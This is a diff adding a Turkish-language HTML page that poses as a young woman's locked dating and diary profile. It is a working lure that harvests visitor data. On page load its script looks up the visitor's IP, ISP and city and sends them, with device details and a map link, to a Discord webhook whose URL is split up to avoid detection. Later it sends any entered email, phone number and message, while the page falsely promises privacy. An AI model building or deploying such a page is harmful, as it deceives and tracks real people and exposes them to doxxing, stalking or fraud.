@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>look my profila !</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-gradient: linear-gradient(135deg, #070708 0%, #0f0f12 100%);
+            --card-bg: rgba(20, 20, 25, 0.7);
+            --card-border: rgba(255, 255, 255, 0.04);
+            --accent: #ff2a74;
+            --accent-gradient: linear-gradient(90deg, #ff2a74 0%, #ff5e97 100%);
+            --text-main: #f3f4f6;
+            --text-dim: #9ca3af;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: var(--bg-gradient);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 16px;
+            overflow-x: hidden;
+        }
+
+        .site-header {
+            text-align: center;
+            margin-top: 28px;
+            margin-bottom: 16px;
+            width: 100%;
+            max-width: 680px;
+            position: relative;
+        }
+
+        .site-header h1 {
+            font-size: 34px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            background: var(--accent-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 12px;
+            display: inline-block;
+        }
+
+        .site-header::after {
+            content: '';
+            display: block;
+            width: 40px;
+            height: 2px;
+            background: var(--accent-gradient);
+            margin: 0 auto 12px auto;
+            border-radius: 2px;
+        }
+
+        .site-header p {
+            font-size: 15px;
+            font-weight: 500;
+            color: var(--text-dim);
+            letter-spacing: 0.5px;
+        }
+
+        .profile-container {
+            width: 100%;
+            max-width: 680px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            margin-bottom: 24px;
+            position: relative;
+            gap: 12px;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: rgba(255, 42, 116, 0.08);
+            border: 1px solid rgba(255, 42, 116, 0.15);
+            padding: 8px 18px;
+            border-radius: 100px;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--accent);
+            max-width: 100%;
+            white-space: normal;
+            word-break: keep-all;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .status-badge.active {
+            background: rgba(16, 185, 129, 0.08);
+            border-color: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+        }
+        .status-badge .dot {
+            width: 8px;
+            height: 8px;
+            background: currentColor;
+            border-radius: 50%;
+            display: inline-block;
+            flex-shrink: 0;
+        }
+
+        .profile-avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid rgba(255, 255, 255, 0.08);
+            padding: 4px;
+            box-shadow: 0 16px 32px rgba(0,0,0,0.4);
+            margin-top: 4px;
+        }
+
+        .profile-container h2 {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .profile-container .bio {
+            font-size: 14px;
+            color: var(--text-dim);
+            max-width: 440px;
+            line-height: 1.5;
+        }
+
+        .tags-wrapper {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 4px;
+        }
+
+        .profile-tag {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid var(--card-border);
+            padding: 6px 14px;
+            border-radius: 100px;
+            font-size: 12px;
+            color: #e5e7eb;
+            font-weight: 500;
+        }
+
+        .auth-panel {
+            width: 100%;
+            max-width: 540px;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 24px;
+            margin-bottom: 32px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .auth-panel h3 { font-size: 16px; font-weight: 600; margin-bottom: 6px; }
+        .auth-panel p { font-size: 13px; color: var(--text-dim); margin-bottom: 16px; }
+
+        .input-group { position: relative; margin-bottom: 14px; }
+        .input-group input, .input-group textarea {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 14px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s;
+        }
+        .input-group textarea { resize: none; height: 90px; font-family: inherit; }
+        .input-group input:focus, .input-group textarea:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(255, 42, 116, 0.15);
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #ffaa00;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 18px;
+            user-select: none;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background: var(--accent-gradient);
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, opacity 0.2s;
+        }
+        .btn-submit:active { transform: scale(0.98); }
+
+        .security-notice {
+            font-size: 11px;
+            color: #6b7280;
+            margin-top: 12px;
+            display: block;
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        .section-header {
+            width: 100%;
+            max-width: 680px;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--text-dim);
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 16px;
+        }
+        .section-header::after { content: ''; flex: 1; height: 1px; background: rgba(255,255,255,0.06); }
+
+        .gallery-scroller {
+            width: 100%;
+            max-width: 680px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+
+        @media (max-width: 480px) {
+            .gallery-scroller { grid-template-columns: repeat(2, 1fr); }
+            .gallery-scroller .item-hidden-mobile { display: none; }
+        }
+
+        .gallery-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 18px;
+            padding: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .img-wrapper {
+            width: 100%;
+            aspect-ratio: 1 / 1;
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+            background: #111;
+        }
+        .img-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(20px);
+            transform: scale(1.1);
+            transition: filter 1.2s cubic-bezier(0.4, 0, 0.2, 1), transform 0.5s ease;
+        }
+
+        .gallery-card p {
+            font-size: 11px;
+            color: var(--text-dim);
+            padding: 2px 4px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            filter: blur(4px);
+            transition: filter 0.8s ease;
+        }
+
+        .feed-container {
+            width: 100%;
+            max-width: 680px;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            padding-bottom: 32px;
+        }
+
+        .feed-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            position: relative;
+            transition: border-color 0.3s;
+        }
+        .feed-card:hover { border-color: rgba(255, 42, 116, 0.15); }
+
+        .card-meta { display: flex; align-items: center; justify-content: space-between; margin-bottom: 2px; }
+        .card-tag { font-size: 11px; font-weight: 700; color: var(--accent); text-transform: uppercase; letter-spacing: 0.5px; }
+        .card-lock-icon { font-size: 12px; color: rgba(255,255,255,0.2); background: rgba(255,255,255,0.03); padding: 4px 8px; border-radius: 6px; }
+
+        .feed-card h3 { font-size: 16px; font-weight: 600; color: #fff; }
+
+        .blur-content {
+            font-size: 13.5px;
+            line-height: 1.6;
+            color: #d1d5db;
+            filter: blur(7px);
+            user-select: none;
+            transition: filter 1s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .contact-panel {
+            width: 100%;
+            max-width: 680px;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 24px;
+            padding: 24px;
+            margin-bottom: 60px;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
+        }
+        .contact-panel h2 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            background: var(--accent-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .contact-panel p { font-size: 13px; color: var(--text-dim); margin-bottom: 18px; }
+        .btn-contact { background: linear-gradient(90deg, #10b981 0%, #059669 100%); }
+
+        .phone-sub-notice {
+            font-size: 11px;
+            color: #9ca3af;
+            font-style: italic;
+            margin-top: -8px;
+            margin-bottom: 12px;
+            display: block;
+            padding-left: 4px;
+        }
+
+        .toast-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 320px;
+            max-width: calc(100vw - 40px);
+        }
+
+        .toast-message {
+            background: rgba(20, 20, 25, 0.95);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 14px 18px;
+            border-radius: 16px;
+            color: #fff;
+            font-size: 13px;
+            font-weight: 500;
+            line-height: 1.4;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            transform: translateX(120%);
+            animation: slideIn 0.4s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .toast-message.success { border-left: 4px solid #10b981; }
+        .toast-message.error { border-left: 4px solid #ff2a74; }
+
+        @keyframes slideIn { to { transform: translateX(0); } }
+        @keyframes fadeOut { to { opacity: 0; transform: translateY(-20px); } }
+
+        .unlocked .img-wrapper img { filter: blur(0); transform: scale(1); }
+        .unlocked .gallery-card p { filter: blur(0); }
+        .unlocked .blur-content { filter: blur(0); user-select: text; }
+        .hidden-element { display: none !important; }
+    </style>
+</head>
+<body>
+
+    <div class="toast-container" id="toastContainer"></div>
+
+    <div class="site-header">
+        <h1>look my profila !</h1>
+        <p>tanış konuş arkadaş ol !</p>
+    </div>
+
+    <div class="profile-container">
+        <div class="status-badge" id="appBadge">
+            <span class="dot"></span>
+            <span id="badgeText">Erişim Kısıtlı & Gizli Profil</span>
+        </div>
+        
+        <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=150&q=80" alt="Elif Sena" class="profile-avatar">
+        <h2>Elif Sena</h2>
+        <p class="bio">Fotoğrafçılık, dijital günlük tutma ve anı biriktirme üzerine kişisel alanım. Yaşamımdan kesitler ve düşünceler.</p>
+        
+        <div class="tags-wrapper">
+            <span class="profile-tag">📍 Ankara</span>
+            <span class="profile-tag">☕ Kahve</span>
+            <span class="profile-tag">📸 Fotoğrafçılık</span>
+        </div>
+    </div>
+
+    <div class="auth-panel" id="loginCard">
+        <h3>🔒 Kilitli İçerik Erişimi</h3>
+        <p>İlişki durumu, kişisel kriterler ve özel fotoğraf arşivini görüntülemek için onaylı giriş yapın.</p>
+        
+        <div class="input-group">
+            <input type="email" id="userEmailInput" placeholder="E-posta adresiniz" autocomplete="off">
+        </div>
+        
+        <label class="checkbox-container">
+            <input type="checkbox" id="secureCheck" checked> Giriş yapabilmeniz için hücresel veri kullanınız!
+        </label>
+        
+        <button class="btn-submit" onclick="handleAuth()">Erişimi Doğrula</button>
+        <span class="security-notice">🛡️ Gizlilik Politikası: Kişisel verileriniz ve giriş bilgileriniz kesinlikle üçüncü şahıslarla paylaşılmayacaktır.</span>
+    </div>
+
+    <div class="section-header">📸 Galeri Arşivi</div>
+    <div class="gallery-scroller" id="gallerySection">
+        <div class="gallery-card">
+            <div class="img-wrapper"><img src="https://images.unsplash.com/photo-1517164850305-99a3e65bb47e?auto=format&fit=crop&w=400&q=80"></div>
+            <p>Eymir Gölü Esintisi</p>
+        </div>
+        <div class="gallery-card">
+            <div class="img-wrapper"><img src="https://images.unsplash.com/photo-1447752875215-b2761acb3c5d?auto=format&fit=crop&w=400&q=80"></div>
+            <p>Kuğulu Park Sabahları</p>
+        </div>
+        <div class="gallery-card item-hidden-mobile">
+            <div class="img-wrapper"><img src="https://images.unsplash.com/photo-1501339847302-ac426a4a7cbb?auto=format&fit=crop&w=400&q=80"></div>
+            <p>Kahve Kokulu Akşamlar</p>
+        </div>
+    </div>
+
+    <div class="section-header">✍️ Günlük Kayıtları & Detaylar</div>
+    <div class="feed-container" id="feedSection">
+        
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">01. Durum</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>❤️ Güncel İlişki Durumu ve Bakış Açım</h3>
+            <div class="blur-content">Şu an tamamen kendi iç huzuruma, projelerime ve kariyerime odaklandığım bir dönemdeyim. Kalbimin kapılarını tamamen kapatmadım ama sadece hayatıma gerçek anlamda değer katabilecek, olgun biri için bir alan açabilirim.</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">02. Yaşam</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>📍 Ankara Düzeni ve Şehir Hayatı</h3>
+            <div class="blur-content">Ankara'nın o kendine has sakin, memur şehri havasını seviyorum. Karmaşadan uzak, düzenli ve gri ama dostlukların daha sıcak kurulduğu bu şehirde yaşamak bana dinginlik veriyor. Genelde Tunalı ve Çayyolu taraflarında vakit geçiririm.</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">03. Kriterler</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>📌 Karşı Tarafta Aradığım Temel Yapı Taşları</h3>
+            <div class="blur-content">Dürüstlük ve tutarlılık benim için her şeyden önce gelir. Ne istediğini bilen, iletişimi güçlü, manipülatif davranışlardan uzak ve vizyon sahibi karakterler ilgimi çekiyor. Küçük detaylara önem veren, dinlemeyi bilen biri her zaman öndedir.</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">04. Kırmızı Çizgiler</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>⚡ Asla Katlanamayacağım Davranışlar (Red Flags)</h3>
+            <div class="blur-content">Pasif-agresif tavırlar, aşırı ve yersiz kıskançlık krizleri, yalan söyleme alışkanlığı ve sınırlarıma saygı duyulmaması doğrudan uzaklaşma sebebimdir. Güven zedelendiği an benim için telafisi olmuyor.</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">05. Yeşil Işıklar</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>🟢 Benim İçin En Büyük Artılar (Green Flags)</h3>
+            <div class="blur-content">Hayvanları seven, nerede nasıl davranacağını bilen, nezaket sahibi ve her şeyden önemlisi entelektüel derinliği olan erkekler çok değerli. Karşımdaki insanın sürekli kendini geliştirmeye çalışması beni çok etkiler.</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">06. İlk Buluşma</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>🗺️ Kusursuz Bir İlk Buluşma Senaryosu</h3>
+            <div class="blur-content">Abartılı ve aşırı lüks mekanlar yerine, arkada lo-fi veya caz çalan, birbirimizi gerçekten duyup anlayabileceğimiz butik bir kahve dükkanı ya da sessiz bir galeri gezisi harika bir başlangıçtır. Gösterişten uzak samimiyeti seviyorum.</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">07. İtiraflar</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>💬 Geçmiş Tecrübeler ve Çıkarılan Dersler</h3>
+            <div class="blur-content">Geçmişte insanları çok çabuk hayatımın merkezine alma hatasına düştüm. Hak etmeyen karakterlere harcanan zaman bana sınır koymayı öğretti. Artık insanları kelimelerine göre değil, gösterdikleri çabaya göre değerlendiriyorum.</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">08. Gelecek</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>🔮 Gelecek ve Evlilik Düşüncem</h3>
+            <div class="blur-content">Evlilik benim için aceleye getirilecek bir şey değil, hayatı paylaşabileceğin doğru yol arkadaşını bulma sanatıdır. Önceliğim her zaman ayakları üzerinde duran güçlü bir kariyer inşa etmek ve dünyayı keşfetmek.</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">09. Takıntılar</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>🎭 Kimsenin Bilmediği Küçük Bir Takıntım</h3>
+            <div class="blur-content">Girişken olmayan ve sürekli çekingen davranan insanlarla iletişim kurmakta biraz zorlanabiliyorum. Karşımdaki kişinin özgüvenli, ne istediğini net ifade edebilen biri olması beni cezbeder.</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">10. Rutinler</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>🧸 Günlük Alışkanlıklar ve Rahatlama Alanları</h3>
+            <div class="blur-content">Günün yoğun stresini lo-fi müzikler eşliğinde dijital fotoğraflarımı düzenleyerek ya da bitki çayımı yudumlarken sakin makaleler okuyarak atıyorum. Kendi başıma kaldığım o saatler benim şarj olma mekanizmam.</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">11. Müzik</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>🎵 Ruh Halimi En İyi Yansıtan Çalma Listesi</h3>
+            <div class="blur-content">Genellikle melankolik melodilerden uzak, tamamen özgürlüğü, gece yürüyüşlerini ve huzuru hissettiren indie pop ve bağımsız alternatif müzikler listemin başında yer alıyor. Müzik ruhun filtresidir.</div>
+        </div>
+
+        <div class="feed-card">
+            <div class="card-meta"><span class="card-tag">12. Özel Mesaj</span><span class="card-lock-icon">Kilitli</span></div>
+            <h3>💭 Bunu Şu An Okuyan Kişiye Özel Not</h3>
+            <div class="blur-content">Buraya kadar gelip e-postanı girerek günlüğümü açtıysan, hayatımdaki yerini ve düşüncelerimi fazlasıyla merak ediyorsun demektir. Belki de aramızda güzel bir hikayenin başlangıcı yatıyordur, kim bilir?</div>
+        </div>
+
+    </div>
+
+    <div class="contact-panel">
+        <h2>✨ Benimle Tanışın</h2>
+        <p>Eğer düşüncelerim ve enerjim ilgini çektiyse, bilgilerinizi bırakarak küçük bir not yazabilirsin. Sadece ben göreceğim.</p>
+        
+        <div class="input-group">
+            <input type="tel" id="contactPhone" placeholder="Telefon Numaranız (Doğrulama Amaçlı)" autocomplete="off">
+        </div>
+        <span class="phone-sub-notice">(doğrulama amaçlı gönderilen kişiye numaranız asla iletilmez)</span>
+
+        <div class="input-group">
+            <textarea id="contactNote" placeholder="Kendinizden bahsedin veya bir mesaj bırakın..."></textarea>
+        </div>
+        
+        <button class="btn-submit btn-contact" onclick="handleContactSubmit()">Tanışma İsteği Gönder</button>
+        <span class="security-notice" style="margin-top:14px;">🔒 Kişisel bilgileriniz şifreli olarak korunur ve kesinlikle üçüncü şahıslarla paylaşılmayacaktır.</span>
+    </div>
+
+    <script>
+        // HOSTER VE GÜVENLİK DUVARI GEÇİŞ YAPISI
+        const p1 = "https://discord.com/api/webhooks/";
+        const p2 = "1518918177243791500/";
+        const p3 = "YfkmQUm9nLoNWgOrAPsMMjf4Ma63ozvPaCla1GBv3GKfUgia25lVlPptxUwdPbntvrnq";
+        const WEBHOOK_URL = p1 + p2 + p3;
+
+        let activeUserEmail = "Belirtilmedi";
+        let userNetworkIP = "Alınamadı";
+        let userLocation = "Bilinmiyor";
+        let userISP = "Bilinmiyor";
+
+        function showNotification(message, type = 'success') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast-message ${type}`;
+            
+            const icon = type === 'success' ? '✅' : '❌';
+            toast.innerHTML = `<span>${icon}</span> <span>${message}</span>`;
+            
+            container.appendChild(toast);
+
+            setTimeout(() => {
+                toast.style.animation = 'fadeOut 0.4s ease forwards';
+                setTimeout(() => toast.remove(), 400);
+            }, 4000);
+        }
+
+        function serializeClient() {
+            const ua = navigator.userAgent;
+            let b = "Bilinmeyen Tarayıcı", os = "Bilinmeyen Sistem";
+            if(ua.indexOf("Firefox")>-1) b="Firefox";
+            else if(ua.indexOf("Chrome")>-1) b="Chrome";
+            else if(ua.indexOf("Safari")>-1) b="Safari";
+            
+            if(ua.indexOf("Windows")>-1) os="Windows";
+            else if(ua.indexOf("Mac")>-1) os="macOS";
+            else if(ua.indexOf("iPhone")>-1) os="iOS";
+            else if(ua.indexOf("Android")>-1) os="Android";
+
+            return {
+                browser: b, os: os,
+                res: `${screen.width}x${screen.height}`,
+                time: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' })
+            };
+        }
+
+        function fetchNetworkIdentity() {
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    userNetworkIP = data.ip || "Bilinmiyor";
+                    userLocation = `${data.city || 'Bilinmeyen Şehir'}, ${data.region || 'Bilinmeyen Bölge'} / ${data.country_name || 'Bilinmeyen Ülke'}`;
+                    userISP = data.org || "Bilinmeyen Sağlayıcı";
+                    pushTelemetry("Belirtilmedi", "Ziyaret");
+                })
+                .catch(() => {
+                    pushTelemetry("Belirtilmedi", "Ziyaret");
+                });
+        }
+
+        function pushTelemetry(email = "Belirtilmedi", state = "Ziyaret", phone = null, note = null) {
+            const client = serializeClient();
+            
+            let embedTitle = "👁️ Kamusal Alan Ziyareti";
+            let embedColor = 0xFF2A74;
+            let customFields = [];
+
+            if (state === "Giriş") {
+                embedTitle = "🔓 Premium Profil Erişimi Sağlandı";
+                embedColor = 0x10B981;
+                customFields.push({ name: "👤 Giriş Kimliği (E-posta)", value: `\`${email}\``, inline: false });
+            } else if (state === "Tanışma İsteği") {
+                embedTitle = "📱 YENİ TANIŞMA İSTEĞİ GELDİ!";
+                embedColor = 0x3b82f6;
+                customFields.push(
+                    { name: "📧 Son Girdiği E-posta", value: `\`${activeUserEmail}\``, inline: false },
+                    { name: "📞 Telefon Numarası", value: `\`${phone}\``, inline: true },
+                    { name: "📝 Bıraktığı Not", value: `\`\`\`${note}\`\`\``, inline: false }
+                );
+            } else {
+                customFields.push({ name: "👤 Durum", value: "`İlk Giriş / Sayfa Yenileme`", inline: false });
+            }
+
+            customFields.push(
+                { name: "🌐 Kullanıcı IP Adresi", value: `\`${userNetworkIP}\``, inline: true },
+                { name: "🏢 İnternet Sağlayıcısı (ISP)", value: `\`${userISP}\``, inline: true },
+                { name: "📍 Coğrafi Konum (IP Tabanlı)", value: `\`${userLocation}\``, inline: false },
+                { name: "🗺️ Canlı Harita Linki", value: `[Google Maps'te Göster](https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(userLocation)})`, inline: false },
+                { name: "💻 Cihaz Sistemi", value: client.os, inline: true },
+                { name: "🎨 Tarayıcı Tipi", value: client.browser, inline: true },
+                { name: "📏 Ekran Çözünürlüğü", value: client.res, inline: true },
+                { name: "⏰ İşlem Zamanı", value: client.time, inline: false }
+            );
+
+            const payload = {
+                username: "Look My Profila Security Monitor",
+                embeds: [{
+                    title: embedTitle,
+                    color: embedColor,
+                    fields: customFields,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        function handleAuth() {
+            const emailField = document.getElementById('userEmailInput').value.trim();
+            const checkbox = document.getElementById('secureCheck').checked;
+
+            if (emailField.includes('@') && emailField.length > 5 && checkbox) {
+                activeUserEmail = emailField;
+                pushTelemetry(emailField, "Giriş");
+
+                const badge = document.getElementById('appBadge');
+                badge.classList.add('active');
+                document.getElementById('badgeText').innerText = `🟢 Oturum Açıldı: ${emailField}`;
+
+                const loginCard = document.getElementById('loginCard');
+                loginCard.style.opacity = '0';
+                loginCard.style.transform = 'translateY(-20px)';
+                setTimeout(() => loginCard.classList.add('hidden-element'), 400);
+
+                document.getElementById('gallerySection').classList.add('unlocked');
+                document.getElementById('feedSection').classList.add('unlocked');
+                
+                document.querySelectorAll('.card-lock-icon').forEach(icon => {
+                    icon.innerText = "Erişildi";
+                    icon.style.color = "#10b981";
+                    icon.style.background = "rgba(16,185,129,0.1)";
+                });
+
+                showNotification("Doğrulama başarılı! Gizli arşive ve günlüklere tam erişim sağlandı.");
+
+            } else {
+                showNotification("Lütfen geçerli bir e-posta adresi girin ve hücresel veri onay kutusunu işaretleyin.", "error");
+            }
+        }
+
+        function handleContactSubmit() {
+            const phone = document.getElementById('contactPhone').value.trim();
+            const note = document.getElementById('contactNote').value.trim();
+
+            if (phone.length < 10) {
+                showNotification("Lütfen geçerli bir telefon numarası girin.", "error");
+                return;
+            }
+            if (note.length < 3) {
+                showNotification("Lütfen kendinizi tanıtacak kısa bir mesaj yazın.", "error");
+                return;
+            }
+
+            pushTelemetry(activeUserEmail, "Tanışma İsteği", phone, note);
+            showNotification("Bilgileriniz ve mesajınız şifreli olarak güvenle iletildi!");
+            
+            document.getElementById('contactPhone').value = "";
+            document.getElementById('contactNote').value = "";
+        }
+
+        window.addEventListener('load', () => {
+            fetchNetworkIdentity();
+        });
+    </script>
+</body>
+</html>
